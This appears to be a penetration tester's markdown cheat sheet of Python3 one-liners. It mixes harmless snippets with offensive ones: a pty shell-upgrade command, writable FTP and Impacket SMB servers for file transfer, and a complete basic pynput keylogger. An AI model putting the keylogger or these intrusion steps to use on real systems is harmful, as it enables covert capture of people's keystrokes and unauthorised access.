# Python3

**[Back to Command-Center](https://github.com/codetorok/command-center/blob/master/README.md)**

### One liners and quick scripts

* install requirements: `sudo python3 -m pip install -r requirements.txt `
* to spawn a shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`
* webservers: `python3 -m http.server 8080`
* if webserver is picked up by the firewall use ftp server: `python3 -m pyftpdlib -p 21 --write` and if you don't have it get it first with: `pip3 install pyftpdlib` and to log in just use the IP address of your ftp server: `ftp <ftp server IP>`

#### QRCode generator (Python3)

```
import qrcode

input_data = "https://google.com"
qr = qrcode.QRCode(version=1, box_size=10, border=5)
qr.add_data(input_data)
qr.make(fit=True)
img = qr.make_image(fill='black', back_color='white')
img.save('qrcode001.png')
```

#### progress bar (Python3)

```
for i in range(0, 51):
    time.sleep(0.1)
    sys.stdout.write("{} [{}{}]\r".format(i, '#' * i, "." * (50 - i)))
    sys.stdout.flush()
sys.stdout.write("\n")

```

#### printing and checking a usage form and switches (Python3)

```
if len(sys.argv) == 1:
    print("USAGE: python3 the_sys_module.py <code name>")
    print("No arguments, exiting...")
    sys.exit(9)
if sys.argv[1] == "tellmemore":
    print("Code name accepted..., exiting with exit code 0.")
else:
    print("Wrong code name, exiting with exit code 3.")
```
#### keylogger (basic)

```
from pynput.keyboard import Key, Listener
import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
	level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
```
#### Python3 FTP Server

* Simple to use: `python3 -m pyftpdlib` and just make sure you have pyftpdlib installed with pip3.

#### SMB Server - Impacket

* `smbserver.py SPITFIRE ./`
